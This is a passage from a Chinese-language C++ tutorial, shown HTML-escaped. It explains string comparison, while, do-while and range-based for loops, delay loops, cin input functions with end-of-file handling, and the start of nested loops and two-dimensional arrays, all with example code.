可能 true (如果编译器优化)，也可能 false std::cout &lt;&lt; &quot;Info: p1 == p2 (compiler might optimize literals)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Info: p1 != p2 (compiler might not optimize literals)&quot; &lt;&lt; std::endl; &#125; if (p3 == word1) &#123; // true, p3 指向 word1 的起始地址 std::cout &lt;&lt; &quot;Info: p3 == word1 (same address)&quot; &lt;&lt; std::endl; &#125; // 正确: 使用 strcmp() 比较内容 if (strcmp(word1, word3) == 0) &#123; // 比较内容是否相等 std::cout &lt;&lt; &quot;Correct: strcmp(word1, word3) == 0 (contents are equal)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Correct: strcmp(word1, word3) != 0&quot; &lt;&lt; std::endl; &#125; if (strcmp(word1, word2) &lt; 0) &#123; // 比较 word1 是否小于 word2 std::cout &lt;&lt; &quot;Correct: strcmp(word1, word2) &lt; 0 (\\&quot;apple\\&quot; &lt; \\&quot;apply\\&quot;)&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 5.1.15 比较string类字符串与 C 风格字符串不同，C++ 的 std::string 类重载了所有的关系运算符（==, !=, &lt;, &gt;, &lt;=, &gt;=）。 这意味着你可以直接使用这些运算符来比较两个 std::string 对象的内容（按字典序进行比较）。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; std::string s1 = &quot;apple&quot;; std::string s2 = &quot;apply&quot;; std::string s3 = &quot;apple&quot;; std::string s4 = &quot;Banana&quot;; // 直接使用 == 比较内容 if (s1 == s3) &#123; std::cout &lt;&lt; &quot;s1 == s3 is true (contents are equal)&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;s1 == s3 is false&quot; &lt;&lt; std::endl; &#125; // 直接使用 != if (s1 != s2) &#123; std::cout &lt;&lt; &quot;s1 != s2 is true&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;s1 != s2 is false&quot; &lt;&lt; std::endl; &#125; // 直接使用 &lt;, &gt; 等进行字典序比较 if (s1 &lt; s2) &#123; std::cout &lt;&lt; &quot;s1 &lt; s2 is true (\\&quot;apple\\&quot; &lt; \\&quot;apply\\&quot;)&quot; &lt;&lt; std::endl; &#125; if (s1 &lt; s4) &#123; // 比较 &quot;apple&quot; 和 &quot;Banana&quot; std::cout &lt;&lt; &quot;s1 &lt; s4 is true (\\&quot;apple\\&quot; &gt; \\&quot;Banana\\&quot; due to case)&quot; &lt;&lt; std::endl; // 注意：比较是区分大小写的，&#x27;a&#x27; 的 ASCII 值大于 &#x27;B&#x27; &#125; else &#123; std::cout &lt;&lt; &quot;s1 &lt; s4 is false (\\&quot;apple\\&quot; &gt; \\&quot;Banana\\&quot; due to case)&quot; &lt;&lt; std::endl; &#125; // 也可以和 C 风格字符串字面值比较 if (s1 == &quot;apple&quot;) &#123; std::cout &lt;&lt; &quot;s1 == \\&quot;apple\\&quot; is true&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 使用 std::string 进行字符串比较比使用 C 风格字符串和 strcmp() 更直观、更安全。 5.2 while循环while 循环是 C++ 中另一种重要的循环结构。与 for 循环不同，while 循环在结构上更简单，它只包含一个**测试条件 (Test Condition)**。只要该条件为 true，循环体就会一直执行。 语法: 123456789while (test_condition) &#123; // 循环体 (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125;// 或者如果循环体只有一条语句while (test_condition) single_statement; 执行流程: 计算 test_condition。 如果 test_condition 为 false，跳出循环，执行循环后面的代码。 如果 test_condition 为 true，执行循环体中的语句。 回到步骤 1。 关键点: while 循环是一种**入口条件循环 (Entry-Condition Loop)**，即在每次执行循环体之前检查条件。如果第一次检查条件就为 false，则循环体一次也不会执行。 循环体内部必须有能够影响 test_condition 的语句（例如修改用于判断的变量），否则如果条件初始为 true，循环将永远不会停止，形成**无限循环 (Infinite Loop)**。 用法与示例: 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int count = 0; // 使用 while 循环打印数字 0 到 4 std::cout &lt;&lt; &quot;Counting with while (0-4):&quot; &lt;&lt; std::endl; while (count &lt; 5) &#123; // 1. 测试条件 std::cout &lt;&lt; &quot;count = &quot; &lt;&lt; count &lt;&lt; std::endl; // 2. 循环体 count++; // 3. 更新条件变量 (非常重要!) &#125; std::cout &lt;&lt; &quot;Loop finished.&quot; &lt;&lt; std::endl; // 示例：等待用户输入特定字符 char response; std::cout &lt;&lt; &quot;\\nEnter &#x27;y&#x27; to continue: &quot;; std::cin &gt;&gt; response; while (response != &#x27;y&#x27; &amp;&amp; response != &#x27;Y&#x27;) &#123; std::cout &lt;&lt; &quot;Invalid input. Please enter &#x27;y&#x27; to continue: &quot;; std::cin &gt;&gt; response; &#125; std::cout &lt;&lt; &quot;Continuing...&quot; &lt;&lt; std::endl; return 0;&#125; 5.2.1 for与whilefor 循环和 while 循环在很多情况下是可以互换的，因为它们都可以用来实现基于条件的重复执行。 转换关系: 一个典型的 for 循环： 123for (initialization; test_condition; update) &#123; body;&#125; 可以等价地转换为 while 循环： 12345initialization; // 初始化移到循环之前while (test_condition) &#123; // 测试条件保持不变 body; update; // 更新移到循环体的末尾&#125; 选择依据: for 循环: 优点: 将初始化、测试和更新逻辑集中在循环头部，结构清晰，特别适用于计数循环（循环次数已知或易于计算）或需要按固定步长迭代的情况。 适用场景: 遍历数组、按索引处理字符串、执行固定次数的操作。 while 循环: 优点: 结构更简单，只关注循环条件，适用于循环次数不确定，依赖于某个事件或状态改变的情况。 适用场景: 等待用户输入、读取文件直到结束、处理链表、当循环条件比计数器更新更重要时。 示例 (两种循环实现相同功能): 123456789101112131415161718192021#include &lt;iostream&gt;int main() &#123; // 使用 for 循环计算 1 到 5 的和 int sum_for = 0; for (int i = 1; i &lt;= 5; ++i) &#123; sum_for += i; &#125; std::cout &lt;&lt; &quot;Sum using for: &quot; &lt;&lt; sum_for &lt;&lt; std::endl; // 使用 while 循环计算 1 到 5 的和 int sum_while = 0; int i_while = 1; // 初始化 while (i_while &lt;= 5) &#123; // 测试条件 sum_while += i_while; i_while++; // 更新 &#125; std::cout &lt;&lt; &quot;Sum using while: &quot; &lt;&lt; sum_while &lt;&lt; std::endl; return 0;&#125; 虽然两者可以转换，但选择更自然地表达循环意图的结构可以提高代码的可读性。 5.2.2 等待一段时间：编写延时循环有时我们需要让程序暂停执行一段时间。虽然有更精确、更现代的方法（如 C++11 &lt;chrono&gt; 和 &lt;thread&gt; 库），但可以使用循环来实现简单的、基于处理器时间的**延时循环 (Delay Loop)**。 这种方法不精确且不推荐用于实际的精确延时，因为它： 依赖于处理器速度: 在快的 CPU 上执行时间短，在慢的 CPU 上执行时间长。 受编译器优化影响: 编译器可能会识别出循环体为空或无副作用，并将其完全优化掉。 浪费 CPU 资源: 循环在空转，消耗 CPU 时间，无法执行其他有用任务。 基本思路: 执行一个已知需要一定时间的空循环或简单操作的循环。 示例 (使用 &lt;ctime&gt; 库): &lt;ctime&gt; (或 C 的 &lt;time.h&gt;) 库提供了一些与时间相关的函数，可以用来实现稍微好一点（但仍不理想）的延时。 clock(): 返回程序启动以来所用的时钟计时单元 (clock ticks) 数。 CLOCKS_PER_SEC: 一个常量，表示每秒包含的时钟计时单元数。 1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;ctime&gt; // 为了 clock() 和 CLOCKS_PER_SECint main() &#123; std::cout &lt;&lt; &quot;Starting delay...&quot; &lt;&lt; std::endl; float delay_seconds = 2.5f; // 期望延时 2.5 秒 // 获取开始时间 clock_t start_time = clock(); // 计算目标结束时间 (以 clock ticks 为单位) clock_t target_ticks = delay_seconds * CLOCKS_PER_SEC; // 循环直到经过了足够多的 clock ticks while (clock() &lt; start_time + target_ticks) &#123; // 循环体可以为空，或者执行一些轻量操作 // ; // 空语句 &#125; std::cout &lt;&lt; &quot;Delay finished after approximately &quot; &lt;&lt; delay_seconds &lt;&lt; &quot; seconds.&quot; &lt;&lt; std::endl; // 另一个简单的空循环延时 (非常不精确) // long wait = 0; // while (wait &lt; 100000000) &#123; // 循环次数需要根据机器调整 // wait++; // &#125; // std::cout &lt;&lt; &quot;Simple loop delay finished.&quot; &lt;&lt; std::endl; return 0;&#125; 再次强调: 对于需要精确延时或暂停执行而不浪费 CPU 的场景，应使用 C++11 及更高版本提供的 &lt;chrono&gt; 和 &lt;thread&gt; 中的 std::this_thread::sleep_for() 或 std::this_thread::sleep_until()。 1234567891011121314151617#include &lt;iostream&gt;#include &lt;chrono&gt; // 为了时间单位 (e.g., seconds, milliseconds)#include &lt;thread&gt; // 为了 std::this_thread::sleep_forint main() &#123; std::cout &lt;&lt; &quot;Starting modern delay...&quot; &lt;&lt; std::endl; // 延时 2 秒 500 毫秒 std::chrono::seconds sec(2); std::chrono::milliseconds ms(500); std::this_thread::sleep_for(sec + ms); // 线程休眠，不消耗 CPU std::cout &lt;&lt; &quot;Modern delay finished.&quot; &lt;&lt; std::endl; return 0;&#125; 这个现代方法更精确、可移植性更好，并且不会浪费 CPU 周期。 5.3 do while循环do while 循环是 C++ 提供的第三种循环结构。它与 while 循环非常相似，但有一个关键区别：do while 循环是**出口条件循环 (Exit-Condition Loop)**，而 while 循环是入口条件循环。 这意味着 do while 循环会先执行一次循环体，然后再检查测试条件。只要条件为 true，循环就会继续执行。 语法: 123456do &#123; // 循环体 (statement(s) to be executed repeatedly) statement1; statement2; // ...&#125; while (test_condition); // 注意这里的条件后面必须有分号 ; 或者如果循环体只有一条语句（虽然不常见，且为了清晰通常还是用花括号）： 123do single_statement;while (test_condition); 执行流程: 执行循环体中的语句。 计算 test_condition。 如果 test_condition 为 true，回到步骤 1。 如果 test_condition 为 false，循环终止，执行循环后面的代码。 关键点: 至少执行一次: 由于条件是在循环体执行之后检查的，do while 循环的循环体至少会执行一次，即使条件初始就为 false。 分号: while (test_condition) 后面必须有一个分号 ;。 适用场景: 当你需要确保循环体中的代码至少执行一次时，do while 循环是理想的选择。例如，获取用户输入并验证，至少需要获取一次输入才能进行验证。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;int main() &#123; int number; // 示例：要求用户输入一个正数 // 循环体至少执行一次以获取输入 do &#123; std::cout &lt;&lt; &quot;Enter a positive number: &quot;; std::cin &gt;&gt; number; if (number &lt;= 0) &#123; std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl; &#125; &#125; while (number &lt;= 0); // 条件在输入之后检查 std::cout &lt;&lt; &quot;You entered the positive number: &quot; &lt;&lt; number &lt;&lt; std::endl; // 比较: 如果使用 while，需要先获取一次输入 // int number_while; // std::cout &lt;&lt; &quot;\\nEnter a positive number (using while): &quot;; // std::cin &gt;&gt; number_while; // while (number_while &lt;= 0) &#123; // std::cout &lt;&lt; &quot;Invalid input. Please try again.&quot; &lt;&lt; std::endl; // std::cout &lt;&lt; &quot;Enter a positive number (using while): &quot;; // std::cin &gt;&gt; number_while; // &#125; // std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; number_while &lt;&lt; std::endl; // 即使条件初始为 false，循环体也执行一次 int count = 5; std::cout &lt;&lt; &quot;\\nStarting do-while with count = 5 (condition count &lt; 5 is false):&quot; &lt;&lt; std::endl; do &#123; std::cout &lt;&lt; &quot; Inside do-while loop, count = &quot; &lt;&lt; count &lt;&lt; std::endl; // 这行会执行 count++; &#125; while (count &lt; 5); // 第一次检查时 count 是 6, 条件为 false std::cout &lt;&lt; &quot;After do-while loop, count = &quot; &lt;&lt; count &lt;&lt; std::endl; // count 变为 6 return 0;&#125; 与 while 和 for 的比较: while: 入口条件，可能一次都不执行。 for: 通常用于计数或已知迭代次数，结构包含初始化、条件、更新。 do while: 出口条件，保证至少执行一次。 根据循环逻辑选择最合适的循环结构可以使代码更清晰、更易于理解。如果需要确保操作至少发生一次（如菜单选择、输入验证），do while 是一个很好的选择。 5.4 基于范围的for循环（C++11）C++11 引入了一种更简洁、更易读的 for 循环语法，称为基于范围的 for 循环 (Range-Based for Loop) 或 增强 for 循环 (Enhanced for Loop)**。它专门用于遍历一个序列（或范围）中的所有元素**，例如数组、STL 容器（如 vector, array, string）、初始化列表等。 目的: 简化遍历操作，减少手动管理索引或迭代器的代码，避免常见的差一错误 (off-by-one errors)。 语法: 12345for (declaration : range_expression) &#123; // 循环体 // 使用 declaration 访问当前元素 statement;&#125; declaration: 声明一个变量，其类型应与 range_expression 中元素的类型兼容（或可以转换）。在每次循环迭代中，该变量会被初始化为范围中的当前元素。 通常使用 auto 让编译器自动推断类型。 auto variable: variable 会成为当前元素的副本。修改 variable 不会影响原始序列中的元素。 auto&amp; variable: variable 会成为当前元素的引用。修改 variable 会修改原始序列中的元素。用于需要修改元素或避免复制大型对象开销的情况。 const auto&amp; variable: variable 会成为当前元素的常量引用。不能通过 variable 修改元素，但可以避免复制开销。用于只读访问。 :: 用于分隔声明和范围表达式。 range_expression: 一个可以表示序列的表达式。这通常是： 数组名。 STL 容器对象（如 std::vector, std::array, std::string, std::list 等）。 初始化列表 &#123; ... &#125;。 任何定义了 begin() 和 end() 成员函数或可以通过全局 begin() 和 end() 函数获取迭代器的对象。 执行流程: 循环会自动遍历 range_expression 中的每一个元素。在每次迭代中： 从序列中获取下一个元素。 将该元素的值（或引用）赋给 declaration 中声明的变量。 执行循环体。 重复此过程，直到遍历完序列中的所有元素。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;array&gt; // 为了 std::arrayint main() &#123; // 1. 遍历数组 double prices[] = &#123;19.99, 25.50, 9.75, 100.0&#125;; std::cout &lt;&lt; &quot;Prices (array):&quot;; for (double price : prices) &#123; // price 是每个元素的副本 std::cout &lt;&lt; &quot; &quot; &lt;&lt; price; &#125; std::cout &lt;&lt; std::endl; // 2. 遍历 std::vector std::vector&lt;int&gt; numbers = &#123;1, 2, 3, 4, 5&#125;; std::cout &lt;&lt; &quot;Numbers (vector):&quot;; for (int num : numbers) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; num; &#125; std::cout &lt;&lt; std::endl; // 3. 遍历 std::string std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Characters (string):&quot;; for (char c : message) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; c; &#125; std::cout &lt;&lt; std::endl; // 4. 遍历初始化列表 std::cout &lt;&lt; &quot;Initializer list:&quot;; for (int x : &#123;10, 20, 30, 40&#125;) &#123; std::cout &lt;&lt; &quot; &quot; &lt;&lt; x; &#125; std::cout &lt;&lt; std::endl; // 5. 使用 auto 简化声明 std::array&lt;std::string, 3&gt; fruits &#123;&quot;Apple&quot;, &quot;Banana&quot;, &quot;Cherry&quot;&#125;; std::cout &lt;&lt; &quot;Fruits (array with auto):&quot;; for (auto fruit : fruits) &#123; // fruit 是 std::string 的副本 std::cout &lt;&lt; &quot; &quot; &lt;&lt; fruit; &#125; std::cout &lt;&lt; std::endl; // 6. 使用引用修改元素 (auto&amp;) std::vector&lt;int&gt; scores = &#123;70, 85, 90&#125;; std::cout &lt;&lt; &quot;Original scores:&quot;; for (int score : scores) std::cout &lt;&lt; &quot; &quot; &lt;&lt; score; std::cout &lt;&lt; std::endl; for (auto&amp; score_ref : scores) &#123; // score_ref 是元素的引用 score_ref += 5; // 给每个分数加 5 &#125; std::cout &lt;&lt; &quot;Scores after adding 5:&quot;; for (int score : scores) std::cout &lt;&lt; &quot; &quot; &lt;&lt; score; // 输出修改后的分数 std::cout &lt;&lt; std::endl; // 7. 使用常量引用进行只读访问 (const auto&amp;) std::cout &lt;&lt; &quot;Reading scores (const auto&amp;):&quot;; for (const auto&amp; score_cref : scores) &#123; // score_cref += 1; // 错误! 不能通过常量引用修改 std::cout &lt;&lt; &quot; &quot; &lt;&lt; score_cref; &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 优点: 简洁: 代码更短，意图更清晰（“对范围中的每个元素做某事”）。 安全: 避免了手动管理索引或迭代器可能导致的错误（如越界访问、迭代器失效等）。 通用: 适用于所有定义了 begin() 和 end() 的标准容器以及内置数组和初始化列表。 局限性: 无法直接获取索引: 如果在循环中需要知道当前元素的索引，基于范围的 for 循环本身不提供这个信息。需要额外维护一个计数器变量。 123456std::vector&lt;int&gt; data = &#123;100, 200, 300&#125;;int index = 0;for (int val : data) &#123; std::cout &lt;&lt; &quot;Index &quot; &lt;&lt; index &lt;&lt; &quot;: &quot; &lt;&lt; val &lt;&lt; std::endl; index++;&#125; 遍历整个范围: 它总是从头到尾遍历整个范围。如果需要更复杂的遍历模式（如反向、跳跃、只遍历部分范围），传统的 for 循环或 while 循环配合迭代器可能更合适。 修改容器大小: 在循环体内修改容器的大小（例如，在 vector 中 push_back 或 erase）通常是不安全的，可能导致迭代器失效和未定义行为。基于范围的 for 循环不适合这种情况。 总结: 基于范围的 for 循环是 C++11 提供的一个非常有用的特性，极大地简化了对序列中所有元素的遍历操作。在不需要索引且需要遍历整个序列的情况下，它通常是比传统 for 循环更优选、更安全、更易读的选择。 5.5 循环和文本输入循环结构在处理文本输入时非常有用，特别是当我们需要逐个字符或逐行读取数据，直到满足某个条件（如遇到特定字符、文件结束或达到一定数量）时。本节将探讨使用 cin 及其相关方法进行文本输入的常见模式和技巧。 5.5.1 使用原始的cin进行输入我们已经知道，使用 cin &gt;&gt; variable 可以从标准输入读取数据。当用于读取文本（如 char 或 string）时，cin &gt;&gt; 的行为特点是： 跳过空白: 它会自动忽略输入流中开头的任何空白字符（空格、制表符、换行符）。 读取直到空白: 它会读取非空白字符，直到遇到下一个空白字符为止。 空白符留在流中: 停止读取时遇到的那个空白字符会留在输入流（输入缓冲区）中，等待下一次读取操作。 这使得 cin &gt;&gt; 适合读取单个单词或以空白分隔的数据项，但不适合读取包含空格的整行文本或精确地逐个字符处理（包括空格）。 用法与示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; char ch; std::string word; std::cout &lt;&lt; &quot;Enter some characters (e.g., &#x27;a b c&#x27;): &quot;; // 读取第一个非空白字符 std::cin &gt;&gt; ch; std::cout &lt;&lt; &quot;First char read: &#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; // 如果输入 &quot; a b c&quot;, 这里会读到 &#x27;a&#x27; // 读取下一个单词 std::cin &gt;&gt; word; std::cout &lt;&lt; &quot;Next word read: \\&quot;&quot; &lt;&lt; word &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 会读到 &quot;b&quot; // 再次读取字符 std::cin &gt;&gt; ch; std::cout &lt;&lt; &quot;Next char read: &#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27;&quot; &lt;&lt; std::endl; // 会读到 &#x27;c&#x27; // 循环读取单词直到输入结束 (例如按 Ctrl+Z/Ctrl+D) std::cout &lt;&lt; &quot;\\nEnter words (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; while (std::cin &gt;&gt; word) &#123; // cin &gt;&gt; word 在成功读取时返回 true std::cout &lt;&lt; &quot;Read word: &quot; &lt;&lt; word &lt;&lt; std::endl; &#125; // 注意：循环结束后，cin 可能处于失败状态 return 0;&#125; while (std::cin &gt;&gt; word) 是一种常见的读取模式，它利用了 cin 对象在成功读取时可以被转换为 true 的特性。当读取失败（例如到达文件末尾或遇到无效输入）时，cin 对象会转换为 false，循环终止。 5.5.2 使用cin.get(char)进行补救cin &gt;&gt; 跳过空白并停止于空白的行为有时不是我们想要的，特别是当我们需要读取包括空格在内的每一个字符时。cin.get(char&amp; ch) 成员函数提供了解决方案。 cin.get(char&amp; ch): 尝试从输入流中读取下一个字符（无论它是什么，包括空格、制表符、换行符）。 如果成功读取，将该字符存储在参数 ch 中，并返回 cin 对象本身（可以转换为 true）。 如果到达文件末尾或发生错误，不修改 ch，并将 cin 置于失败状态（转换为 false）。 这使得 cin.get(char) 非常适合在循环中逐个读取所有字符。 用法与示例: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; char ch; int count = 0; std::cout &lt;&lt; &quot;Enter text (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // 循环读取每一个字符，包括空白符 while (std::cin.get(ch)) &#123; // 尝试读取一个字符到 ch // 成功读取，处理字符 ch std::cout &lt;&lt; ch; // 逐个字符回显 count++; &#125; std::cout &lt;&lt; &quot;\\n--- End of input ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Total characters read: &quot; &lt;&lt; count &lt;&lt; std::endl; return 0;&#125; 这个循环会读取并回显用户输入的所有字符，包括空格和换行，直到遇到文件结束符。 5.5.3 使用哪个cin.get()istream 类（cin 是其对象）实际上提供了几个名为 get 的成员函数（函数重载）： cin.get(char&amp; ch): (已在 5.5.2 讨论) 读取下一个字符到参数 ch 中。 返回 cin 对象。 适合在 while 条件中直接使用 while(cin.get(ch))。 cin.get(): (无参数版本) 读取下一个字符。 返回该字符的整数 ASCII 码（或 wchar_t 对应的值）。 如果到达文件末尾或发生错误，返回特殊值 EOF (End Of File，通常定义为 -1，在 &lt;iostream&gt; 或 &lt;cstdio&gt; 中定义)。 不直接将字符存入变量，需要接收其返回值。 选择依据: cin.get(char&amp; ch): 当你需要将读取的字符直接存储到一个 char 变量中，并且想利用 cin 对象在 while 条件中的布尔转换特性时，这是最常用的选择。 cin.get() (无参数): 当你需要显式地检查文件结束符 EOF 时，或者当你需要获取字符的整数值时，这个版本更合适。返回值需要与 EOF 进行比较。 用法与示例 (cin.get() 无参数版本): 123456789101112131415161718192021#include &lt;iostream&gt;#include &lt;cstdio&gt; // 为了 EOF (虽然 iostream 通常也包含)int main() &#123; int ch_int; // 注意类型是 int，以接收 EOF int count = 0; std::cout &lt;&lt; &quot;Enter text (Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // 循环读取，直到遇到 EOF while ((ch_int = std::cin.get()) != EOF) &#123; // 读取字符的 int 值并与 EOF 比较 // 成功读取 (不是 EOF) std::cout &lt;&lt; static_cast&lt;char&gt;(ch_int); // 将 int 值转回 char 进行输出 count++; &#125; std::cout &lt;&lt; &quot;\\n--- End of input ---&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Total characters read: &quot; &lt;&lt; count &lt;&lt; std::endl; return 0;&#125; 两种 get 方法都可以用于逐字符读取，选择哪种取决于你喜欢的判断循环结束的方式（检查 cin 状态还是检查 EOF 返回值）。 5.5.4 文件尾条件当从输入流（如 cin 或文件流）读取数据时，最终会到达输入的末尾，这被称为**文件尾 (End-of-File, EOF)**。程序需要能够检测到 EOF 条件以正常终止读取循环。 有几种方法可以检测 EOF： 检查 cin 状态: cin 对象本身可以转换为布尔值。当读取操作成功时，它转换为 true；当遇到 EOF 或其他错误导致读取失败时，它转换为 false。这是 while (cin &gt;&gt; word) 和 while (cin.get(ch)) 能够工作的原因。 cin.eof(): 如果流是因为到达文件末尾而失败，此函数返回 true。注意: eof() 只有在尝试读取并失败后才会变为 true。不能用它来预测下一次读取是否会到达 EOF。 cin.fail(): 如果发生了非 EOF 的 I/O 错误（例如读取了无效数据类型）或到达 EOF，此函数返回 true。 cin.good(): 如果流处于正常状态（没有设置 eofbit, failbit, badbit），返回 true。 检查 cin.get() 的返回值: 无参数的 cin.get() 在到达 EOF 时返回特殊值 EOF。这是 while ((ch = cin.get()) != EOF) 能够工作的原因。 EOF 的触发: 键盘输入: 通常通过按下特定的组合键来模拟 EOF： Unix/Linux/macOS: Ctrl+D (通常需要在行首按) Windows: Ctrl+Z (通常需要在一行结束后按 Enter，然后再按 Ctrl+Z 再按 Enter) 文件输入: 当读取操作尝试越过文件的最后一个字节时，会触发 EOF。 示例 (使用 cin 状态): 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;iostream&gt;int main() &#123; int number; int sum = 0; int count = 0; std::cout &lt;&lt; &quot;Enter numbers (non-number or Ctrl+Z/D to stop):&quot; &lt;&lt; std::endl; // 循环读取，直到 cin 失败 (EOF 或类型不匹配) while (std::cin &gt;&gt; number) &#123; sum += number; count++; &#125; std::cout &lt;&lt; &quot;\\n--- Input finished ---&quot; &lt;&lt; std::endl; // 检查循环结束的原因 if (std::cin.eof()) &#123; std::cout &lt;&lt; &quot;Reason: End-of-File reached.&quot; &lt;&lt; std::endl; &#125; else if (std::cin.fail()) &#123; // fail() 在 eof() 时也可能为 true，但这里我们排除了 eof // 如果是因为类型不匹配（例如输入了字母），fail() 为 true, eof() 为 false std::cout &lt;&lt; &quot;Reason: Invalid input (non-number).&quot; &lt;&lt; std::endl; // 可能需要清除错误状态并忽略无效输入以继续 // std::cin.clear(); // std::cin.ignore(10000, &#x27;\\n&#x27;); &#125; else if (std::cin.bad()) &#123; std::cout &lt;&lt; &quot;Reason: Unrecoverable stream error.&quot; &lt;&lt; std::endl; &#125; if (count &gt; 0) &#123; std::cout &lt;&lt; &quot;Read &quot; &lt;&lt; count &lt;&lt; &quot; numbers. Sum = &quot; &lt;&lt; sum &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;No valid numbers were entered.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 理解如何检测 EOF 对于编写能正确处理输入结束的循环至关重要。最常用的方法是利用 cin 对象或 cin.get() 在 while 条件中的行为。 5.5.5 另一个cin.get()版本除了读取单个字符的 get() 函数外，istream 还提供了用于读取 C 风格字符串（字符数组）的 get() 版本： cin.get(char* buffer, int size, char delimiter = &#39;\\n&#39;): 从输入流中读取字符，并将它们存储到 buffer 指向的字符数组中。 最多读取 size - 1 个字符（为末尾的空字符 \\0 留出空间）。 如果在读取 size - 1 个字符之前遇到 delimiter 字符，则停止读取。 delimiter 字符本身不会被读取到 buffer 中，而是会留在输入流中。 (这是与 getline 的主要区别之一)。 读取结束后，总会在 buffer 的末尾添加一个空字符 \\0。 返回 cin 对象。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;const int BUFFER_SIZE = 20;int main() &#123; char name[BUFFER_SIZE]; char address[BUFFER_SIZE]; std::cout &lt;&lt; &quot;Enter your name (max &quot; &lt;&lt; BUFFER_SIZE - 1 &lt;&lt; &quot; chars): &quot;; // 读取最多 BUFFER_SIZE - 1 个字符，或直到遇到换行符 std::cin.get(name, BUFFER_SIZE); // 检查读取是否成功以及是否还有剩余字符（换行符） if (std::cin) &#123; // 检查流状态是否良好 std::cout &lt;&lt; &quot;Name entered: &quot; &lt;&lt; name &lt;&lt; std::endl; // 问题：换行符 &#x27;\\n&#x27; 仍然留在输入流中！ // 如果直接调用下一个 get 或 getline，它会立即读到换行符 // 处理残留的换行符 // 方法1: 读取并丢弃单个字符 (如果是换行符) if (std::cin.peek() == &#x27;\\n&#x27;) &#123; // peek() 查看下一个字符但不读取 std::cin.ignore(); // 读取并丢弃一个字符 &#125; // 方法2: 读取并丢弃直到换行符 (更通用) // std::cin.ignore(10000, &#x27;\\n&#x27;); std::cout &lt;&lt; &quot;Enter your address (max &quot; &lt;&lt; BUFFER_SIZE - 1 &lt;&lt; &quot; chars): &quot;; std::cin.get(address, BUFFER_SIZE); if (std::cin) &#123; std::cout &lt;&lt; &quot;Address entered: &quot; &lt;&lt; address &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Error reading address or EOF reached.&quot; &lt;&lt; std::endl; &#125; &#125; else &#123; std::cout &lt;&lt; &quot;Error reading name or EOF reached.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 与 getline(cin, string) 的比较: cin.get(buffer, size): 用于 C 风格字符数组。 需要指定缓冲区大小以防止溢出。 不读取分隔符，分隔符留在流中。 需要手动处理留在流中的分隔符。 getline(cin, str): 用于 std::string 对象。 自动管理内存，无需担心缓冲区溢出。 读取并丢弃分隔符（默认为 \\n）。 通常更方便、更安全。 由于 cin.get(buffer, size) 不读取分隔符并将其留在流中，这常常导致后续输入出现问题。因此，在现代 C++ 中，当需要读取整行文本时，**强烈推荐使用 getline(cin, std::string)**。cin.get(buffer, size) 主要用于需要与 C 风格字符串 API 交互或有特定限制的场景。 5.6 嵌套循环和二维数组嵌套循环 (Nested Loop) 是指一个循环结构完全包含在另一个循环结构的循环体内部。外层循环每执行一次，内层循环会完整地执行一遍（从开始到结束）。嵌套循环常用于处理具有多维结构的数据，例如表格、矩阵或图像的像素。 二维数组 (Two-Dimensional Array) 是数组的一种扩展，可以看作是“数组的数组”。它在概念上像一个表格或网格，有行 (row) 和列 (column)。二维数组是使用嵌套循环处理的典型数据结构。 嵌套循环示例: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; const int ROWS = 3; const int COLS = 4; std::cout &lt;&lt; &quot;Nested loop example (printing coordinates):&quot; &lt;&lt; std::endl; // 外层循环控制行 for (int i = 0; i &lt; ROWS; ++i) &#123; // 内层循环控制列 for (int j = 0; j &lt; COLS; ++j) &#123; // 对于外层循环的每次迭代 (i)，内层循环会完整执行一遍 (j 从 0 到 COLS-1) std::cout &lt;&lt; &quot;(&quot; &lt;&lt; i &lt;&lt; &quot;,&quot; &lt;&lt; j &lt;&lt; &quot;) &quot;; &#125; std::cout &lt;&lt; std::endl; // 每行结束后换行 &#125; return 0;&#125; 输出: 1234Nested loop example (printing coordinates):(0,0) (0,1) (0,2) (0,3) (1,0) (1,1) (1,2) (1,3) (2,0) (2,1) (2,2) (2,3) 5.6.1 初始化二维数组声明二维数组需要指定两个维度的大小：第一个是行数，第二个是列数。 声明语法: 1typeName arrayName[numberOfRows][numberOfColumns]; 初始化方法: 可以使用嵌套的花括号 &#123;&#125; 